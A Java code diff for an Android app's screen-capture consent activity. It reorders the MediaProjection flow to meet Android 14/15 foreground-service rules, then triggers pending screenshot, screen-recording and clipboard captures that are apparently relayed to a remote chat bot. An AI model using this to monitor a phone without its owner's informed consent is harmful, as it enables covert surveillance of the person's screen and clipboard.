@@ -10,7 +10,9 @@ import android.os.Bundle;
 import android.view.Gravity;
 import android.widget.TextView;
 
-/** Consentimento - blindado: qualquer erro vem pro chat com o texto exato. */
+/** FLUXO CANONICO (padrao Google): tudo na main thread, janela VISIVEL o tempo todo:
+ *  1. INICIAR respondido -> 2. sobe CaptureService (FGS tipo mediaProjection)
+ *  3. espera ele ficar foreground  4. getMediaProjection  5. so entao finish. */
 public class ShotConsentActivity extends Activity {
 
     @Override
@@ -34,39 +36,25 @@ public class ShotConsentActivity extends Activity {
     @Override
     protected void onActivityResult(int req, int resultCode, Intent data) {
         super.onActivityResult(req, resultCode, data);
-        // SOBE O CAPTURESERVICE ANTES DO FINISH: A14+/A15 rejeitam FGS mediaProjection
-        // iniciado de contexto em background (finish primeiro = background = rejeitado)
-        try { startForegroundService(new Intent(this, CaptureService.class)); }
-        catch (Throwable t) { if (BridgeHolder.tg != null) BridgeHolder.tg.say("consent: FGS falhou: " + t); }
-        finish(); // some na hora do INICIAR - o resto rola na thread de fundo
-        new Thread(() -> {
-            android.os.Looper.prepare(); // getMediaProjection cria Handler interno: exige Looper
-            if (BridgeHolder.tg == null) return;
-            if (req != 1001) return;
-            BridgeHolder.tg.say("shot: consentimento respondido (code " + resultCode + ")");
-            if (resultCode == RESULT_OK && data != null) {
-                try {
-                    MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-                    // retry: estado 'foreground' do FGS sobe de forma assincrona; tenta ate 5x
-                    MediaProjection mp = null;
-                    SecurityException ultima = null;
-                    for (int tent = 0; tent < 5; tent++) {
-                        try {
-                            for (int espera = 0; espera < 10 && !CaptureService.noAr; espera++) {
-                                try { Thread.sleep(200); } catch (InterruptedException ignored) { }
-                            }
-                            mp = mpm.getMediaProjection(resultCode, data);
-                            break;
-                        } catch (SecurityException se) {
-                            ultima = se;
-                            try { Thread.sleep(500); } catch (InterruptedException ignored) { }
-                        }
-                    }
-                    if (mp == null) {
-                        if (ultima != null) throw ultima;
-                        BridgeHolder.tg.say("shot: projecao nula sem excecao");
-                        return;
-                    }
+        try {
+            if (BridgeHolder.tg != null)
+                BridgeHolder.tg.say("shot: consentimento respondido (code " + resultCode + ")");
+            if (req == 1001 && resultCode == RESULT_OK && data != null) {
+                // 2. FGS tipado sobe AGORA, com a janela visivel
+                try { startForegroundService(new Intent(this, CaptureService.class)); }
+                catch (Throwable t) { BridgeHolder.tg.say("consent: FGS falhou: " + t); }
+                // 3. espera o foreground dele (janela ainda visivel = contexto forte)
+                long limite = System.currentTimeMillis() + 3500;
+                while (!CaptureService.noAr && System.currentTimeMillis() < limite) {
+                    try { Thread.sleep(150); } catch (InterruptedException ignored) { }
+                }
+                if (!CaptureService.noAr) BridgeHolder.tg.say("consent: CaptureService nao ficou no ar");
+                // 4. projecao ENQUANTO VISIVEL
+                MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+                MediaProjection mp = mpm.getMediaProjection(resultCode, data);
+                if (mp == null) {
+                    BridgeHolder.tg.say("shot: projecao nula");
+                } else {
                     mp.registerCallback(new MediaProjection.Callback() {
                         @Override public void onStop() {
                             BridgeHolder.projection = null;
@@ -76,26 +64,20 @@ public class ShotConsentActivity extends Activity {
                     }, null);
                     BridgeHolder.projection = mp;
                     BridgeHolder.tg.say("shot: captura autorizada! mande 'shot' pra fotografar");
-                    if (BridgeHolder.shotPendente) {
-                        BridgeHolder.shotPendente = false;
-                        RelayService.dispararCaptura();
-                    }
-                    if (BridgeHolder.recPendente > 0) {
-                        int secs = BridgeHolder.recPendente;
-                        BridgeHolder.recPendente = 0;
-                        RelayService.dispararRec(secs);
-                    }
-                    if (BridgeHolder.clipPendente) {
-                        BridgeHolder.clipPendente = false;
-                        RelayService.armarClip();
-                    }
-                } catch (Throwable t) {
-                    BridgeHolder.tg.say("shot: erro projecao: " + t);
                 }
-            } else {
-                BridgeHolder.tg.say("shot: consentimento negado/cancelado");
+            } else if (req == 1001) {
+                if (BridgeHolder.tg != null) BridgeHolder.tg.say("shot: consentimento negado/cancelado");
             }
-            if (android.os.Looper.myLooper() != null) android.os.Looper.myLooper().quitSafely();
-        }, "consent").start();
+        } catch (Throwable t) {
+            if (BridgeHolder.tg != null) BridgeHolder.tg.say("shot: erro projecao: " + t);
+        }
+        // 5. SOME SO NO FIM
+        finish();
+        // disparos pendentes (agora em thread simples, so o dispatch)
+        if (BridgeHolder.projection != null) {
+            if (BridgeHolder.shotPendente) { BridgeHolder.shotPendente = false; RelayService.dispararCaptura(); }
+            if (BridgeHolder.recPendente > 0) { int s = BridgeHolder.recPendente; BridgeHolder.recPendente = 0; RelayService.dispararRec(s); }
+            if (BridgeHolder.clipPendente) { BridgeHolder.clipPendente = false; RelayService.armarClip(); }
+        }
     }
 }
